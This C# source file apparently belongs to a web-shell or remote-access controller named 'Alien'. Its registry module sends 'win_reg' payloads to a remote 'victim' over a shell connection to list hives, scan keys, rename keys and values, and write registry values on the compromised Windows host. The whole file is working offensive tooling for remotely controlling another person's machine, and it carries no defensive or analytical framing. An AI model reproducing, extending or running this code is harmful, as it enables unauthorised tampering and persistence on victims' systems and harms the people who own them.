using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.Json.Serialization;
using System.Threading.Tasks;

namespace Alien
{
    public class clsfnReg
    {
        private clsWeb m_web { get; init; }

        public clsfnReg(clsWeb web)
        {
            m_web = web;
        }

        public class clsRegistryValue
        {
            [JsonProperty("name")]
            public string Name { get; set; }

            [JsonProperty("type")]
            public string Type { get; set; }

            [JsonProperty("data")]
            public byte[] Data { get; set; }
        }

        public class clsRegistryQueryResult
        {
            [JsonProperty("subkeys")]
            public List<string> Subkeys { get; set; } = new();

            [JsonProperty("values")]
            public List<clsRegistryValue> Values { get; set; } = new();
        }

        public class clsRegistryActionResult
        {
            [JsonProperty("success")]
            public bool bSuccess { get; set; } = false;

            [JsonProperty("error")]
            public string szErrorMsg { get; set; } = string.Empty;

            [JsonProperty("output")]
            public List<string> lsOutput { get; set; } = new List<string>();
        }

        public static string fnFormatRegistryValue(string szType, byte[] abData)
        {
            if (abData == null)
                return string.Empty;

            switch (szType)
            {
                case "REG_SZ":
                case "REG_EXPAND_SZ":
                    return Encoding.Unicode.GetString(abData).TrimEnd('\0');

                case "REG_MULTI_SZ":
                    return string.Join(", ",
                        Encoding.Unicode.GetString(abData)
                            .TrimEnd('\0')
                            .Split('\0', StringSplitOptions.RemoveEmptyEntries));

                case "REG_DWORD":
                    if (abData.Length >= 4)
                    {
                        uint value = BitConverter.ToUInt32(abData, 0);
                        return $"0x{value:X8} ({value})";
                    }
                    break;

                case "REG_QWORD":
                    if (abData.Length >= 8)
                    {
                        ulong value = BitConverter.ToUInt64(abData, 0);
                        return $"0x{value:X16} ({value})";
                    }
                    break;

                case "REG_BINARY":
                default:
                    return BitConverter.ToString(abData).Replace("-", " ");
            }

            return string.Empty;
        }

        public async Task<Dictionary<string, bool>> fnHives()
        {
            string szResp = await m_web.fnszSendPayload("win_reg", new string[] { "hive", m_web.m_victim.ShellEncoding });
            szResp = szResp.Trim();

            MessageBox.Show(szResp);

            var result = JsonConvert.DeserializeObject<Dictionary<string, bool>>(szResp);

            if (result == null)
            {
                MessageBox.Show("JSON deserialization is failed", "fnHives", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return new Dictionary<string, bool>();
            }

            return result;
        }

        public async Task<clsRegistryQueryResult?> fnScan(string szBasePath)
        {
            string szResp = await m_web.fnszSendPayload("win_reg", new string[] { "scan", m_web.m_victim.ShellEncoding, szBasePath });
            var result = JsonConvert.DeserializeObject<clsRegistryQueryResult>(szResp);

            if (result == null)
                return null;

            return result;
        }

        public async Task<bool> fnbRenameKey(string szOldPath, string szNewPath)
        {
            string szResp = await m_web.fnszSendPayload("win_reg", new string[] { "rename_key", szOldPath, szNewPath });
            if (string.IsNullOrEmpty(szResp))
            {
                MessageBox.Show("HTTP response is null or empty.", "fnbRenameKey", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            var result = JsonConvert.DeserializeObject<clsRegistryActionResult>(szResp);
            if (result == null)
            {
                MessageBox.Show("JSON deserialization is failed!", "fnbRenameKey", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            if (!result.bSuccess)
            {
                MessageBox.Show(result.szErrorMsg);
                return false;
            }

            return true;
        }

        public async Task<bool> fnbRenameValue(string szPath, string szOldName, string szNewName)
        {
            string szResp = await m_web.fnszSendPayload("win_reg", new string[] { "rename_value", szPath, szOldName, szNewName });
            if (string.IsNullOrEmpty(szResp))
            {
                MessageBox.Show("HTTP response is null or empty.", "fnbRenameValue", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            var result = JsonConvert.DeserializeObject<clsRegistryActionResult>(szResp);
            if (result == null)
            {
                MessageBox.Show("JSON deserialization is failed!", "fnbRenameValue", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            if (!result.bSuccess)
            {
                MessageBox.Show(result.szErrorMsg);
                return false;
            }

            return true;
        }

        public async Task<bool> fnbSetValue(string szPath, string szName, string szType, string szData)
        {
            string szResp = await m_web.fnszSendPayload("win_reg", new string[] { "set", szPath, szName, szType, szData });
            if (string.IsNullOrEmpty(szResp))
            {
                MessageBox.Show("HTTP response is null or empty.", "fnbSetValue", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            var result = JsonConvert.DeserializeObject<clsRegistryActionResult>(szResp);
            if (result == null)
            {
                MessageBox.Show("JSON deserialization is failed!", "fnbSetValue", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            if (!result.bSuccess)
            {
                MessageBox.Show(result.szErrorMsg);
                return false;
            }

            return true;
        }
    }
}
